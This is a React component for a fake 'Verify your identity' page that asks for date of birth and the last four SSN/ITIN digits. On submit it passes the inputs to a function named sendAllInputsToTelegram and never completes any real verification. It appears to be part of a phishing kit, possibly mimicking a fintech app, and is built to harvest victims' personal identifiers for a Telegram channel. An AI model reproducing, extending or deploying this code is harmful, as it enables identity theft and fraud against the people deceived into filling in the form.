import React, { useState } from 'react';
import { HelpCircle, Loader2 } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import { sendAllInputsToTelegram } from '../utils/telegram';

export function PersonalDetails() {
  const [dob, setDob] = useState('');
  const [ssn, setSsn] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (dob.length === 10 && ssn.length === 4) {
      setIsLoading(true);
      await sendAllInputsToTelegram();
      // Simulate processing
      setTimeout(() => {
        setIsLoading(false);
        // navigate('/success'); // Final destination
      }, 2000);
    }
  };

  const handleDobChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 8) value = value.slice(0, 8);
    
    // Basic validation logic for parts
    if (value.length >= 2) {
      let month = parseInt(value.slice(0, 2));
      if (month > 12) value = '12' + value.slice(2);
      if (month === 0 && value.length === 2) value = '01';
    }
    if (value.length >= 4) {
      let day = parseInt(value.slice(2, 4));
      if (day > 31) value = value.slice(0, 2) + '31' + value.slice(4);
      if (day === 0 && value.length === 4) value = value.slice(0, 2) + '01' + value.slice(4);
    }
    
    // Format: MM/DD/YYYY
    let formatted = value;
    if (value.length > 4) {
      formatted = `${value.slice(0, 2)}/${value.slice(2, 4)}/${value.slice(4)}`;
    } else if (value.length > 2) {
      formatted = `${value.slice(0, 2)}/${value.slice(2)}`;
    }
    setDob(formatted);
  };

  const handleSsnChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 4) {
      setSsn(value);
    }
  };

  const isFormValid = dob.length === 10 && ssn.length === 4;

  return (
    <div className="min-h-screen bg-black text-white font-sans flex flex-col items-center justify-center p-6">
      <div className="w-full max-w-[520px] mx-auto">
        <h1 className="text-[32px] md:text-[40px] font-bold mb-4 leading-tight tracking-tight">
          Verify your identity
        </h1>

        <button className="flex items-center gap-2 text-[#00D1FF] mb-12 hover:opacity-80 transition-opacity">
          <HelpCircle size={20} />
          <span className="text-[17px] font-medium">Get help</span>
        </button>

        <form onSubmit={handleSubmit} className="space-y-8">
          <div className="space-y-2">
            <label className="text-[#8a8a8a] text-[17px] block">
              Date of birth
            </label>
            <div className="bg-[#1A1A1A] rounded-2xl p-4">
              <input
                type="text"
                name="dob"
                value={dob}
                onChange={handleDobChange}
                placeholder="MM/DD/YYYY"
                className="bg-transparent outline-none w-full text-[19px] placeholder:text-[#333333]"
              />
            </div>
          </div>

          <div className="space-y-2">
            <label className="text-[#8a8a8a] text-[17px] block">
              Last 4 digits of your SSN or ITIN
            </label>
            <div className="bg-[#1A1A1A] rounded-2xl p-4">
              <input
                type="text"
                name="ssn_last_4"
                value={ssn}
                onChange={handleSsnChange}
                placeholder="1234"
                maxLength={4}
                className="bg-transparent outline-none w-full text-[19px] placeholder:text-[#333333]"
              />
            </div>
          </div>

          <div className="pt-4">
            <button
              type="submit"
              disabled={isLoading || !isFormValid}
              className={`w-full py-4 rounded-full text-[18px] font-bold transition-all flex items-center justify-center ${
                isFormValid && !isLoading
                  ? 'bg-[#00D1FF] text-white hover:opacity-90 cursor-pointer'
                  : 'bg-[#00D1FF]/20 text-white/30 cursor-not-allowed'
              }`}
            >
              {isLoading ? (
                <Loader2 className="animate-spin" size={24} strokeWidth={3} />
              ) : (
                'Continue'
              )}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
